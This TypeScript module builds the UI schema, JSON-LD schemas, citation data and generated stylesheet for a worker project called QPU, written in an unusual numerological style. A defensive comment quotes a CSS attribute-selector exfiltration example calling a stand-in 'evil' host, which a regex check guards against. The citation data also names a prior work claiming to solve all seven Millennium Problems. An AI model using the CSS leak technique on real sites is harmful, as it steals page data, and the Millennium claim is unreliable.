// Cooled out of index.ts by the heat family (scripts/cool.mjs): genesisOf, pentagramOf, accessOf, qpuHologramOf, qpuZoneOf, zoneHostOf, tenantZoneOf, schemasOf, qpuCiteOf, presenceOf, cssOf, reflectOf, robotsOf, seoZoneOf.
import {
  QPU_ZONE_HOSTS,
  coins,
  cors,
  faceOf,
  messageLanes,
  mintOf,
  n,
  occupancies,
  onceOf,
  cernExperimentsOf,
  contextOf,
  hexDecodeOf,
  hexFamiliesOf,
  qpuHexUuidOf,
  hostsOf,
  pentagramHolds,
  seatHandleOf,
  seoZoneHolds,
  stepsOf,
  raidClouds,
  raidTypesOf,
  schemaOrg,
  seed,
  seoZoneFieldsOf,
  skills,
  storageHref,
  ten,
  theorem,
  unit,
} from './index.js'
import { packageVersion } from './version.js'
import { circuitOf } from './circuit.js'
import { leanOf, leanHolds } from './proof.js'
import { quantumOf, qpuQuantumHolds } from './quantum.js'
import { chooseOf, tenOf, cubeOf, qpuHandleOf, facesOf } from '../../../families/lattice/lattice.js'
import { linkGraphOf } from './links.js'

/**
 * The UI schema: shadcn card variants, sizes, states and themes seated on the lattice's faces and rays, served as data (no HTML).
 * @wing presentation
 * @kind builder
 * @evidence genesisHolds
 */
export const genesisOf = onceOf(() => {
  const faces = facesOf()
  const hz = 432
  const card = ['card', 'card-header', 'card-title', 'card-description', 'card-action', 'card-content', 'card-footer'] as const
  const alpine = [...card, 'badge', 'button', 'input'] as const
  const variants = ['default', 'destructive', 'outline', 'secondary', 'ghost', 'link'] as const
  const sizes = ['default', 'xs', 'sm', 'lg', 'icon', 'icon-xs', 'icon-sm', 'icon-lg'] as const
  const state = ['open', 'closed'] as const
  const element = ['self', 'child'] as const
  const theme = ['light', 'dark'] as const
  const domains = ['scanner', 'radar'] as const
  const keys = ['slot', 'variant', 'size', 'state', 'element', 'theme'] as const
  const frameworks = [
    'shadcn',
    'radix',
    'react',
    'vue',
    'svelte',
    'alpine',
    'vitepress',
    'payload',
    'tailwind',
    'cva',
    'panda',
    'vanilla-extract',
    'html',
    'qpu'] as const
  const product = variants.length * sizes.length * (n * n)
  const chooseN = chooseOf(n, coins)
  const chooseRays = chooseOf(faces.rays, coins)
  const nodes = frameworks.map((name, face) => {
    const hop = (face + faces.rays + faces.rays) % faces.faces
    const ray = face % faces.rays
    const team = (face - ray) / faces.rays
    const involution = hop === face
    return {
      face,
      hop,
      ray,
      team,
      involution,
      name,
      schema: 'shadcn' as const,
      domain: domains[team]!,
      slot: card[ray]!,
      holds: involution,
  }
  })
  let occupied = n - n
  for (const node of nodes) if (node.holds) occupied += seed
  const vacant = nodes.length - occupied
  const schema = {
    kind: 'schema' as const,
    name: 'shadcn' as const,
    keys,
    slot: card,
    variant: variants,
    size: sizes,
    state,
    element,
    theme,
    hz,
    holds:
      keys.length === coins * n &&
      card.length === faces.rays &&
      variants.length === coins * n &&
      sizes.length === mintOf(n) &&
      state.length === coins &&
      element.length === coins &&
      theme.length === coins &&
      domains.length === coins}
  const holds =
    schema.holds &&
    product === hz &&
    coins * n * mintOf(n) * (n * n) === hz &&
    alpine.length === ten &&
    chooseN === n &&
    chooseRays === n * faces.rays &&
    chooseOf(n, n - n) === seed &&
    chooseOf(n, n) === seed &&
    frameworks.length === faces.faces &&
    nodes.length === faces.faces &&
    occupied === faces.faces &&
    vacant === n - n &&
    theorem.around(faces.faces, coins, faces.rays) &&
    nodes.every((node) => node.holds && node.schema === 'shadcn')
  return {
    kind: 'genesis' as const,
    '@type': 'DigitalDocument' as const,
    hz,
    schema,
    card,
    alpine,
    variants,
    sizes,
    state,
    element,
    theme,
    domains,
    keys,
    frameworks,
    nodes,
    occupied,
    vacant,
    choose: { n: chooseN, rays: chooseRays },
    product,
    slots: card.length,
    framework: 'shadcn' as const,
    scope: 'all' as const,
    known: frameworks.length,
    holds,
  }
})

/**
 * The occupancy pentagram: five occupancies x five skills joined in a single stroke of step 2.
 * @wing presentation
 * @kind builder
 * @evidence pentagramHolds
 */
export const pentagramOf = onceOf(() => {
  const points = n + coins
  const stroke: number[] = []
  let x = n - n
  for (let i = n - n; i < points; i++) {
    stroke.push(x)
    x = (x + coins) % points
  }
  const unique: number[] = []
  for (const face of stroke) if (!unique.includes(face)) unique.push(face)
  const nodes = occupancies.map((occupancy, face) => ({
    face,
    hop: stroke[face]!,
    occupancy,
    skill: skills[face]!,
    rank: face,
    holds: occupancy === occupancies[face],
  }))
  const holds =
    occupancies.length === points &&
    skills.length === points &&
    stroke.length === points &&
    unique.length === points &&
    nodes.length === points &&
    stroke[n - n] === n - n &&
    stroke[seed] === coins &&
    points === n + coins
  return {
    kind: 'pentagram' as const,
    theorem: 'pentagram' as const,
    points,
    step: coins,
    occupancies,
    skills,
    stroke,
    nodes,
    single: unique.length === points,
    holds,
  }
})

/**
 * Access keys (domain, occupancy) for every occupancy, with their fused names.
 * @wing presentation
 * @kind builder
 * @evidence accessHolds
 */
export const accessOf = onceOf(() => {
  const pentagram = pentagramOf()
  const keys = ['domain', 'handle'] as const
  const holds = keys.length === coins && keys[n - n] === 'domain' && keys[seed] === 'handle' && pentagram.holds && pentagramHolds(pentagram)
  return {
    kind: 'access' as const,
    keys,
    occupancies: pentagram.occupancies,
    holds,
  }
})

/**
 * The 'hologram' reading: the pentagram and access readings composed with the fused capacity and the STORAGE/BLOBS bindings.
 * @wing presentation
 * @kind builder
 * @evidence hologramHolds
 */
export const qpuHologramOf = onceOf(() => {
  const faces = facesOf()
  const cube = cubeOf()
  const handle = qpuHandleOf()
  const pentagram = pentagramOf()
  const access = accessOf()
  const genesis = genesisOf()
  const fused = faces.faces * handle.kv.amplitudes
  const scales = [
    { name: 'occupancy' as const, parts: pentagram.occupancies.length, fused },
    { name: 'skill' as const, parts: pentagram.skills.length, fused },
    { name: 'access' as const, parts: access.keys.length, fused },
    { name: 'mcp' as const, parts: mintOf(n), fused },
    { name: 'faces' as const, parts: faces.faces, fused }] as const
  const fractal = scales.every((row) => row.fused === fused && row.parts > n - n)
  const holds =
    pentagram.holds &&
    access.holds &&
    genesis.holds &&
    fractal &&
    scales.length === n + coins &&
    fused === faces.faces * mintOf(cube.bits + seed) &&
    pentagram.skills.includes('hologram') &&
    pentagram.skills.includes('payload') &&
    pentagram.skills.includes('network')
  return {
    kind: 'hologram' as const,
    fractal,
    theorem: 'fusion' as const,
    pentagram,
    access,
    scales,
    hz: genesis.hz,
    fused,
    next: fused + fused,
    faces: faces.faces,
    tools: mintOf(n),
    holds,
  }
})

/**
 * The zone with each first-party host resolved from its label — the apex carries the empty label and is the zone.
 * @wing presentation
 * @kind builder
 * @evidence zoneHolds
 */
export const qpuZoneOf = onceOf(() => {
  const zone = unit.host.split('.').slice(seed).join('.')
  const hosts = QPU_ZONE_HOSTS.map((h) => {
    const host = h.label === '' ? zone : `${h.label}.${zone}`
    return { ...h, host, origin: `https://${host}`, apex: h.label === '', own: host === unit.host }
  })
  return { zone, hosts, labels: hosts.filter((h) => !h.apex).map((h) => h.label) }
})

/**
 * The first-party host this request landed on, or undefined — and `qpu: false` is as good as absent here.
 *
 * THE APEX IS IN THE TABLE AND OUT OF THIS UNIT'S REACH, which is not a contradiction: the table states what the
 * zone IS, and this lookup answers what this unit is ROUTED to. uuidna.com holds its own custom domain and this
 * worker has no route there — it answers on qpu.uuidna.com and on the *.uuidna.com wildcard, which the apex is
 * not under. Computing a crawlable pair for it produced a sitemap listing a root this unit answers 404 for, and
 * the apex already serves its own robots.txt and its own 11,438-URL sitemap from the worker that does hold it.
  * @wing presentation
  * @kind builder
  * @evidence zoneHostHolds
 */
export const zoneHostOf = (host: unknown) =>
  qpuZoneOf().hosts.find((h) => h.qpu && h.host === String(host ?? '').toLowerCase())

/** The tenant zone QPU serves and the labels in it that are never a tenant — one declaration, read by the router and
 *  by Payload (src/access.ts), never restated there. The zone is this unit's host minus its first label; that label is
  * @wing presentation
  * @kind builder
  * @evidence tenantZoneHolds
 *  this unit, and www is reserved because the router redirects it to the zone's apex. */
export const tenantZoneOf = onceOf(() => {
  const labels = unit.host.split('.')
  const own = labels[n - n]!
  return { zone: labels.slice(seed).join('.'), own, www: 'www' as const, reserved: [own, 'www', 'saas-fallback'] as readonly string[] }
})

/**
 * The JSON-LD schemas the unit serves, mounted under storage, with their prefixes and context.
 * @wing presentation
 * @kind builder
 * @evidence schemasHolds
 */
export const schemasOf = onceOf(() => {
  const cube = cubeOf()
  const faces = facesOf()
  const hosts = hostsOf()
  const types = raidTypesOf(faces)
  const named = [
    { name: 'schema', href: `${schemaOrg}/` },
    { name: 'qpu', href: `${unit.href}#` },
    { name: 'mcp', href: 'https://modelcontextprotocol.io/' },
    { name: 'lean', href: 'https://lean-lang.org/' },
    { name: 'cern', href: 'https://opendata.cern.ch/' },
    { name: 'inspire', href: 'https://inspirehep.net/' },
    { name: 'spdx', href: 'https://spdx.org/licenses/' },
    { name: 'dc', href: 'http://purl.org/dc/terms/' },
    { name: 'jsonld', href: 'https://www.w3.org/ns/json-ld#' },
    { name: 'hydra', href: 'https://www.w3.org/ns/hydra/core#' },
    { name: 'uuid', href: 'https://www.rfc-editor.org/rfc/rfc9562' },
    { name: 'zenodo', href: 'https://zenodo.org/' },
    { name: 'hepdata', href: 'https://www.hepdata.net/' },
    { name: 'cc', href: 'https://creativecommons.org/licenses/by-nc-nd/4.0/' }] as const
  const keys = ['inputSchema', 'input_schema', 'parameters'] as const
  const rows = named.map((row, face) => {
    const hop = (face + faces.rays + faces.rays) % faces.faces
    const host = hosts.nodes[face]!
    const part = face < cube.vertices ? 'vertex' : face < cube.vertices + cube.hexbit ? 'hexbit' : 'coin'
    return {
      name: row.name,
      href: row.href,
      face,
      hop,
      involution: hop === face,
      prefix: row.name,
      part,
      merge: 'storage' as const,
      storage: storageHref,
      raid: types[face]!.name,
      cloud: raidClouds[face]!.name,
      llm: host.llm,
      call: host.call,
      result: host.result,
      schema: host.schema,
      keys,
      holds: hop === face && row.href.length > n - n && host.holds,
  }
  })
  const prefixes = {
    schema: named[n - n]!.href,
    qpu: named[seed]!.href,
    mcp: named[coins]!.href,
    lean: named[n]!.href,
    cern: named[n + seed]!.href,
    inspire: named[n + coins]!.href,
    spdx: named[n + n]!.href,
    dc: named[mintOf(n) - seed]!.href,
    jsonld: named[mintOf(n)]!.href,
    hydra: named[mintOf(n) + seed]!.href,
    uuid: named[ten]!.href,
    zenodo: named[ten + seed]!.href,
    hepdata: named[ten + coins]!.href,
    cc: named[faces.faces - seed]!.href} as const
  const context = [schemaOrg, prefixes] as const
  let occupied = n - n
  for (const row of rows) if (row.holds) occupied += seed
  const vacant = rows.length - occupied
  const efficiency = {
    kind: 'efficiency' as const,
    context: context.length,
    mounted: rows.length,
    ratio: faces.rays,
    tokens: 'four bytes' as const,
    holds: context.length === coins && rows.length === faces.faces && rows.length === coins * faces.rays,
  }
  const compatibility = {
    kind: 'compatibility' as const,
    keys,
    harnesses: hosts.harnesses.length,
    llms: hosts.llms.length,
    holds: hosts.holds && keys.length === n && rows.every((row) => row.keys.length === n),
  }
  const holds =
    faces.holds &&
    hosts.holds &&
    rows.length === faces.faces &&
    occupied === faces.faces &&
    vacant === n - n &&
    context.length === coins &&
    context[n - n] === schemaOrg &&
    prefixes.qpu === `${unit.href}#` &&
    prefixes.schema === `${schemaOrg}/` &&
    rows.every((row) => row.holds && row.involution && row.merge === 'storage') &&
    efficiency.holds &&
    compatibility.holds &&
    cube.vertices + cube.hexbit + coins === faces.faces
  return {
    kind: 'schemas' as const,
    mounted: occupied,
    vacant,
    merge: 'storage' as const,
    href: storageHref,
    rows,
    prefixes,
    context,
    efficiency,
    compatibility,
    holds,
  }
})

/**
 * How to cite the unit (MLA 8): DOI, concept DOI, ORCID, archived version and commit, served version, and whether they match.
 * @wing presentation
 * @kind builder
 * @evidence citeHolds
 */
export const qpuCiteOf = onceOf(() => {
  const lean = leanOf()
  const quantum = quantumOf()
  const author = {
    last: 'Rouschev',
    first: 'Tsvetan',
    orcid: 'https://orcid.org/0009-0000-7312-9778',
  }
  /** THE VERSIONED DOI NAMES THE LATEST ARCHIVED RELEASE. Zenodo mints one record per GitHub Release from the
   *  concept record below. The package version is generated from package.json and moves ahead of that archive;
   *  `current` is whether the two are the same version. */
  const doi = '10.5281/zenodo.23156998'
  const conceptdoi = '10.5281/zenodo.22700098'
  const archive = `https://zenodo.org/records/23156998`
  const identifier = `https://doi.org/${doi}`
  const prior = {
    title: 'All Seven Clay Millennium Problems Sealed via Universal σ-Involution',
    doi: '10.5281/zenodo.21781603',
    conceptdoi: '10.5281/zenodo.21781602',
    archive: 'https://zenodo.org/records/21781603',
  } as const
  const sameAs = [archive, author.orcid, identifier] as const
  /** WHAT THE ARCHIVE HOLDS, BESIDE WHAT THE HOST SERVES. The versioned DOI is one archived commit; the host moves on
   * without it until a new version is archived. Both are said, and `current` says whether they are the same version,
   * so a reader who downloads "this version" knows whether it is the code that answered them. */
  const archived = { doi, archive, version: '1.0.1' as string, commit: '36da076', holds: archive.endsWith(doi.split('.').pop() ?? '') }
  const served = { version: packageVersion, origin: unit.origin, holds: /^1\.(0|[1-9][0-9]*)\.[0-9]$/.test(packageVersion) }
  const current = archived.version === served.version
  const currency = current
    ? `the archive is this version: v${served.version} at ${archived.commit}.`
    : `the archive is behind the host: it holds v${archived.version} at ${archived.commit}; the host serves v${served.version}. Cite the archive for what it holds; the concept DOI ${conceptdoi} resolves to the latest archived version.`
  const website = unit.host
  const mcp = `${unit.origin}/api`
  const worksOf = (title: string, url: string, workDoi = doi, container = website): string =>
    `${author.last}, ${author.first}. ORCID ${author.orcid}. "${title}." ${container}, ${url}. doi:${workDoi}.`
  const priorWorks = worksOf(prior.title, prior.archive, prior.doi, 'Zenodo')
  const rows = [
    { title: unit.kind, url: unit.origin, doi, works: worksOf(unit.kind, unit.origin), holds: unit.origin.startsWith('https://') && unit.kind.length > n - n },
    { title: 'quantum processing unit', url: unit.href, doi, works: worksOf('quantum processing unit', unit.href), holds: unit.href.startsWith('https://') },
    { title: lean.src, url: mcp, doi, works: worksOf(lean.src, mcp), holds: mcp.startsWith(unit.origin) && lean.src.endsWith('/index.lean') }] as const
  const right = `${author.first} ${author.last} explores this knowledge under CC-BY-NC-ND-4.0: attribute the author, do not distribute a derivative, and do not use it commercially unless a commercial licence was granted on request.`
  const holds =
    leanHolds(lean) &&
    qpuQuantumHolds(quantum) &&
    author.last.length > n - n &&
    author.orcid.startsWith('https://orcid.org/') &&
    author.orcid.endsWith('0009-0000-7312-9778') &&
    doi.startsWith('10.5281/zenodo.') &&
    archived.holds &&
    conceptdoi.endsWith('22700098') &&
    prior.doi.endsWith('21781603') &&
    prior.archive.startsWith('https://zenodo.org/records/') &&
    priorWorks.includes(`doi:${prior.doi}`) &&
    priorWorks.includes('Zenodo, ') &&
    right.includes('CC-BY-NC-ND-4.0') &&
    right.includes(`${author.first} ${author.last}`) &&
    right.includes('commercial licence') &&
    archive.startsWith('https://zenodo.org/records/') &&
    website === unit.host &&
    rows.length === n &&
    identifier === `https://doi.org/${doi}` &&
    sameAs.includes(archive) &&
    sameAs.includes(author.orcid) &&
    rows.every(
      (r) =>
        r.holds === true &&
        r.doi === doi &&
        r.works.startsWith(`${author.last}, ${author.first}. ORCID ${author.orcid}. "`) &&
        r.works.includes(`doi:${doi}`) &&
        r.url.startsWith(unit.origin) &&
        !r.url.includes('*'))
  // The commercial-license form names organisation and intended use. Price is a court-tried relation
  // (priceRelationOf / publishing.royalty) — not priceInUSD. Missing royalty rate → holds false.
  // The grant stays a lead until law.reviewed. It is not a 16th law or court formula beyond that gate.
  const grantOf = () => {
    const licence = 'CC-BY-NC-ND-4.0' as const
    const grant: {
      licence: 'CC-BY-NC-ND-4.0'
      organisation: { lead: true }
      use: { lead: true }
      price: 'relation'
      holds: false
      lead: true
      next?: { handle: string; uuid: string }
    } = {
      licence,
      organisation: { lead: true as const },
      use: { lead: true as const },
      price: 'relation',
      holds: false as const,
      lead: true as const,
    }
    try {
      const uuid = qpuHexUuidOf({ family: 'publishing', program: ['royalty'], params: [] })
      const decoded = hexDecodeOf(uuid)
      if (decoded.holds && 'program' in decoded && decoded.program[0] === 'royalty' && decoded.params.length === 0)
        grant.next = { handle: decoded.handle, uuid: decoded.uuid }
    } catch { /* publishing is not registered in this isolate yet */ }
    return grant
  }
  return {
    '@context': contextOf(),
    '@type': 'CreativeWork' as const,
    '@id': `${unit.origin}/cite`,
    url: `${unit.origin}/cite`,
    isAccessibleForFree: cors === '*',
    kind: 'cite' as const,
    style: 'mla8' as const,
    source: 'website' as const,
    when: 'never' as const,
    author,
    website,
    href: unit.origin,
    doi,
    conceptdoi,
    archive,
    identifier,
    sameAs,
    prior: { ...prior, works: priorWorks },
    archived,
    served,
    current,
    currency,
    inText: `(${author.last})`,
    right,
    rows,
    holds,
    get grant() { return grantOf() },
    // The hrefs the citation already prints. A URL pair is not a formula, so each edge holds false and the graph names one next address.
    links: linkGraphOf([
      doi,
      conceptdoi,
      archive,
      identifier,
      prior.doi,
      prior.conceptdoi,
      prior.archive,
      priorWorks,
      `${unit.origin}/cite`,
      ...rows.map((row) => `${row.url}\n${row.works}`),
    ]),
  }
})

/**
 * Presence of users per face (active, inactive, chatting) with starter templates, merged into storage.
 * @wing presentation
 * @kind builder
 * @evidence presenceHolds
 */
export const presenceOf = onceOf(() => {
  const cube = cubeOf()
  const isolate = qpuHandleOf()
  const faces = facesOf()
  const circuit = circuitOf()
  const hosts = hostsOf()
  const schemas = schemasOf()
  const types = raidTypesOf(faces)
  const fused = faces.faces * isolate.kv.amplitudes
  if (messageLanes.length !== faces.faces) {
    messageLanes.length = n - n
    for (let i = n - n; i < faces.faces; i++) messageLanes.push([])
  }
  const users = circuit.lattice.nodes.map((node) => {
    const handle = seatHandleOf(node.face)
    const host = hosts.nodes[node.face]!
    const schema = schemas.rows[node.face]!
    const messages = messageLanes[node.face]!.length
    const chatting = messages > n - n
    return {
      '@id': handle['@id'],
      handle,
      face: node.face,
      hop: node.hop,
      involution: node.involution,
      active: node.holds,
      inactive: node.holds === false,
      chatting,
      messages,
      phenomenon: node.name,
      llm: host.llm,
      schema: schema.name,
      raid: types[node.face]!.name,
      cloud: raidClouds[node.face]!.name,
      merge: 'storage' as const,
      holds: handle.holds && node.holds && host.holds && schema.holds,
  }
  })
  let active = n - n
  let inactive = n - n
  let chatting = n - n
  for (const user of users) {
    if (user.active) active += seed
    else inactive += seed
    if (user.chatting) chatting += seed
  }
  const templates = [
    {
      name: 'next-starter-template' as const,
      href: 'https://github.com/cloudflare/templates/tree/main/next-starter-template',
      binding: 'Static assets' as const,
      door: unit.origin},
    {
      name: 'multiplayer-globe-template' as const,
      href: 'https://github.com/cloudflare/templates/tree/main/multiplayer-globe-template',
      binding: 'Durable Objects' as const},
    {
      name: 'durable-chat-template' as const,
      href: 'https://github.com/cloudflare/templates/tree/main/durable-chat-template',
      binding: 'Durable Objects' as const,
      durable: 'storage' as const}] as const
  const starter = {
    kind: 'starter' as const,
    template: templates[n - n]!.name,
    href: templates[n - n]!.href,
    door: unit.origin,
    type: 'SoftwareApplication' as const,
    holds: templates[n - n]!.name === 'next-starter-template',
  }
  const globe = {
    kind: 'globe' as const,
    template: templates[seed]!.name,
    href: templates[seed]!.href,
    holds: users.every((user) => user.merge === 'storage'),
  }
  const chat = {
    kind: 'chat' as const,
    template: templates[coins]!.name,
    href: templates[coins]!.href,
    durable: 'storage' as const,
    holds: chatting >= n - n && users.every((user) => user.merge === 'storage'),
  }
  const holds =
    cube.holds &&
    isolate.holds &&
    faces.holds &&
    circuit.lattice.holds &&
    hosts.holds &&
    schemas.holds &&
    users.length === faces.faces &&
    active === circuit.lattice.occupied &&
    inactive === circuit.lattice.vacant &&
    templates.length === n &&
    starter.holds &&
    globe.holds &&
    chat.holds &&
    users.every((user) => user.holds && user.handle.id.length === mintOf(n))
  return {
    kind: 'presence' as const,
    templates,
    starter,
    globe,
    chat,
    users,
    active,
    inactive,
    chatting,
    faces: faces.faces,
    fused,
    next: fused + fused,
    merge: 'storage' as const,
    holds,
  }
})

/**
 * The fused stylesheet the unit serves (qpu.css), with its size against the naive stylesheet.
 * @wing presentation
 * @kind builder
 * @evidence cssHolds
 */
export const cssOf = (imagine = '', genesis = genesisOf()) => {
  const faces = facesOf()
  const circuit = circuitOf()
  const milli = tenOf(n)
  const hz = genesis.hz
  const sat = ten * n * coins + coins * n
  const light = ten * n + ten + mintOf(n) + coins
  const mid = (ten * ten) / coins
  const none = n - n
  const seated = imagine.length > none ? faceOf(imagine, faces.faces) : none
  const hop = (seated + faces.rays + faces.rays) % faces.faces
  /** LATTICE PHASE (the captain, 2026-09-12: "re-fuse all animations to follow the quantum lattice"). Every face keeps
   * the one fused keyframe, but its phase is its position on the genesis walk (0, 7, 1, 8, … 6, 13): ray 0's scanner
   * face, its radar face by the hop, the next ray. One negative animation-delay rule reads `--walk`, and the timing
   * function steps once per face, so the grid is the walk itself, not fourteen faces pulsing in line. */
  const walkOf = (face: number) => (face % faces.rays) * coins + (face < faces.rays ? none : seed)
  const walk = stepsOf().walk.map((step) => step.face)
  const physicsOf = (name: string) => {
    if (name === 'split') return { x: none, y: none, r: none, s: coins, a: seed }
    if (name === 'entangle') return { x: coins, y: none, r: none, s: seed, a: seed }
    if (name === 'interfere') return { x: none, y: none, r: none, s: seed, a: none }
    if (name === 'ghz') return { x: none, y: none, r: none, s: n, a: seed }
    if (name === 'noclone') return { x: none, y: none, r: none, s: seed, a: seed }
    if (name === 'teleport') return { x: faces.rays, y: none, r: none, s: seed, a: seed }
    if (name === 'kickback') return { x: none, y: none, r: mintOf(coins + coins), s: seed, a: seed }
    if (name === 'deutsch') return { x: none, y: none, r: none, s: seed, a: seed }
    if (name === 'dense') return { x: none, y: none, r: none, s: coins, a: seed }
    if (name === 'monogamy') return { x: coins, y: none, r: none, s: seed, a: seed }
    if (name === 'qubits') return { x: none, y: none, r: none, s: n, a: seed }
    if (name === 'gates') return { x: coins, y: none, r: none, s: seed, a: seed }
    if (name === 'measurement') return { x: none, y: none, r: none, s: seed, a: seed }
    if (name === 'register') return { x: none, y: ten, r: none, s: seed, a: seed }
    return { x: none, y: none, r: none, s: seed, a: seed }
  }
  const quantumRows = circuit.lattice.nodes.map((node) => ({
    name: node.name,
    face: node.face,
    quantum: node.holds,
    imagine: imagine.length > none && node.face === seated,
    theorem: `theorem ${node.name}`,
    holds: node.holds,
    vars: physicsOf(node.name)}))
  const entangled = cernExperimentsOf()
  const hepRows = entangled.nodes.map((node) => ({
    name: node.name,
    face: node.face,
    domain: node.domain,
    hop: node.hop,
    quantum: node.holds,
    imagine: imagine.length > none && node.face === seated,
    theorem: 'theorem entangle' as const,
    partner: node.partner.name,
    entangled: node.quantum.name,
    product: node.product,
    holds: node.holds,
    vars: physicsOf('entangle')}))
  const experiments = [...quantumRows, ...hepRows]
  /** THE OTHER FIVE KEYS. genesis declares six — slot, variant, size, state, element, theme — and computes their
   * product as variants * sizes * (n * n) = 432 = hz, the frequency this whole sheet is timed to. Only `slot` was
   * ever emitted, so five sixths of the schema was a number the unit could state and not a rule a browser could
   * apply.
   *
   * EACH MEMBER IS SEATED BY ITS INDEX, which is what makes this combinatorial rather than a list. A sheet that
   * named every combination would be variants * sizes * state * element * theme rules and would have to grow by
   * multiplication whenever a key gained a member; this grows by addition, and the consumer reads --qpu-v and
   * --qpu-z and composes the product itself. state is the exception and deliberately so: --qpu-a is already the
   * registered opacity property, and open/closed is exactly what opacity means here.
   *
   * No rule below can initiate a request. That is the one property a publicly served, CORS-* stylesheet must
   * have, and it is checked in holds rather than left to whoever edits this next. */
  const keyed =
    genesis.variants.map((name, k) => `[data-variant=${name}]{--qpu-v:${k}}`).join('') +
    genesis.sizes.map((name, k) => `[data-size=${name}]{--qpu-z:${k}}`).join('') +
    genesis.state.map((name, k) => `[data-state=${name}]{--qpu-a:${k === none ? seed : none}}`).join('') +
    genesis.element.map((name, k) => `[data-element=${name}]{--qpu-e:${k}}`).join('') +
    genesis.theme.map((name, k) => `[data-theme=${name}]{--qpu-t:${k}}`).join('')

  const engine =
    `@layer qpu{` +
    `@property --qpu-x{syntax:"<length>";inherits:false;initial-value:${none}px}` +
    `@property --qpu-y{syntax:"<length>";inherits:false;initial-value:${none}px}` +
    `@property --qpu-r{syntax:"<angle>";inherits:false;initial-value:${none}deg}` +
    `@property --qpu-s{syntax:"<number>";inherits:false;initial-value:${seed}}` +
    `@property --qpu-a{syntax:"<number>";inherits:false;initial-value:${seed}}` +
    `:root{--qpu-hz:${hz};--qpu-n:${n};--qpu-coins:${coins};--qpu-rays:${faces.rays};--qpu-faces:${faces.faces};--qpu-milli:${milli};--qpu-period:calc(1s * var(--qpu-milli) / var(--qpu-hz))}` +
    `.qpu{display:grid;grid-template-columns:repeat(var(--qpu-rays),minmax(0,1fr))}` +
    `.qpu>*{aspect-ratio:${seed};color:hsl(calc(var(--qpu-hz) * var(--face,${none}) / var(--qpu-faces)) ${sat}% ${light}%);animation:qpu var(--qpu-period) steps(var(--qpu-faces),jump-none) infinite;animation-delay:calc(${none - seed} * var(--qpu-period) * var(--walk,${none}) / var(--qpu-faces));will-change:transform,opacity}` +
    `.qpu>*::after{content:attr(data-qpu)}` +
    `.qpu>[data-imagine]{--qpu-s:${coins}}` +
    genesis.card.map((slot) => `[data-slot=${slot}]{display:grid}`).join('') +
    keyed +
    genesis.nodes.map((node) => `[data-framework=${node.name}][data-domain=${node.domain}]{--face:${node.face};--walk:${walkOf(node.face)}}`).join('') +
    `[data-slot=card-header]:has([data-slot=card-action]){grid-template-columns:minmax(0,1fr) auto}` +
    `@keyframes qpu{${mid}%{transform:translate3d(var(--qpu-x),var(--qpu-y),0) rotate(var(--qpu-r)) scale(var(--qpu-s));opacity:var(--qpu-a)}}` +
    `@media (prefers-reduced-motion:reduce){.qpu>*{animation:none;will-change:auto}}` +
    `}`
  const naive = experiments
    .map((row) => `@keyframes qpu-${row.name}{${mid}%{transform:scale(${row.vars.s});opacity:${row.vars.a}}}.${row.name}{animation:qpu-${row.name} var(--qpu-period) linear infinite}`)
    .join('')
  const cover = faces.faces * coins
  const fusedBytes = engine.length
  const naiveBytes = (engine + naive).length
  const keyframes = seed
  const animate = ['transform', 'opacity'] as const
  const holds =
    genesis.holds &&
    circuit.lattice.holds &&
    entangled.holds &&
    experiments.length === cover &&
    experiments.length === faces.faces + faces.faces &&
    quantumRows.length === faces.faces &&
    hepRows.length === faces.faces &&
    hepRows.every((row) => row.quantum && row.product === (seed * seed === none * none) && (row.domain === genesis.domains[n - n] || row.domain === genesis.domains[seed])) &&
    fusedBytes < naiveBytes &&
    keyframes === seed &&
    animate.length === coins &&
    !engine.includes('#') &&
    engine.includes('transform') &&
    engine.includes('opacity') &&
    engine.includes('@keyframes qpu{') &&
    engine.includes('card-action') &&
    // EVERY KEY genesis DECLARES IS A RULE A BROWSER CAN APPLY, not a count the unit can state. Asked per member
    // rather than per key, because a key that emitted its first member and dropped the rest would satisfy any
    // check that only asked whether the key appears.
    genesis.variants.every((name) => engine.includes(`[data-variant=${name}]`)) &&
    genesis.sizes.every((name) => engine.includes(`[data-size=${name}]`)) &&
    genesis.state.every((name) => engine.includes(`[data-state=${name}]`)) &&
    genesis.element.every((name) => engine.includes(`[data-element=${name}]`)) &&
    genesis.theme.every((name) => engine.includes(`[data-theme=${name}]`)) &&
    /**
     * CSS EXFILTRATES WITHOUT JAVASCRIPT — learned from @uuidna/school, which states it best: an attribute
     * selector paired with a request, `[data-x^="a"]{background:url(https://evil/a)}`, leaks a value one
     * character per request, and a policy that permits scripts while forgetting images does nothing about it.
     * This sheet is about to be served publicly under CORS *, so it must initiate no request of any kind.
     *
     * WHERE THE TWO PACKAGES CROSS, THE CHECK GETS STRONGER THAN EITHER. school's stylesheet is written by hand
     * and its tests scan the text, which is the best a fixed string allows. This one is GENERATED from a closed
     * alphabet — the six keys' declared members, the fourteen frameworks, the two domains — so the property is
     * decidable rather than sampled: every attribute value emitted is checked to be one genesis declares, and a
     * value from anywhere else cannot reach the sheet to carry a URL in the first place — the alphabet is closed and every emitted value is checked. The request check below
     * then has nothing left to find, which is the point of it.
     */
    [...engine.matchAll(/\[data-(?:slot|variant|size|state|element|theme|framework|domain)=([^\]]+)\]/g)].every(
      ([, value]) =>
        (genesis.card as readonly string[]).includes(value) ||
        (genesis.variants as readonly string[]).includes(value) ||
        (genesis.sizes as readonly string[]).includes(value) ||
        (genesis.state as readonly string[]).includes(value) ||
        (genesis.element as readonly string[]).includes(value) ||
        (genesis.theme as readonly string[]).includes(value) ||
        (genesis.frameworks as readonly string[]).includes(value) ||
        (genesis.domains as readonly string[]).includes(value)) &&
    /url\(|@import|image-set|element\(/.test(engine) === false &&
    engine.includes('data-framework=shadcn') &&
    engine.includes('data-domain=scanner') &&
    engine.includes('data-domain=radar') &&
    genesis.frameworks.every((name) => engine.includes(`data-framework=${name}`)) &&
    engine.includes(`--qpu-hz:${hz}`) &&
    engine.split('animation-delay').length === coins &&
    engine.includes('--walk') &&
    engine.includes('linear') === false &&
    walk.length === faces.faces &&
    new Set(walk).size === faces.faces &&
    walk.every((face, at) => walkOf(face) === at) &&
    genesis.nodes.every((node) => walkOf(node.face) < faces.faces) &&
    hz === 432 &&
    hop === seated &&
    experiments.every((row) => row.holds)
  return {
    kind: 'css' as const,
    framework: 'qpu' as const,
    hz,
    css: engine,
    experiments,
    animate,
    keyframes,
    slots: genesis.card,
    fused: { bytes: fusedBytes, keyframes, cover },
    naive: { bytes: naiveBytes, keyframes: cover, cover },
    winner: 'fused' as const,
    lattice: { walk, phase: '--walk' as const, ticks: faces.faces },
    imagine: {
      kind: 'imagination' as const,
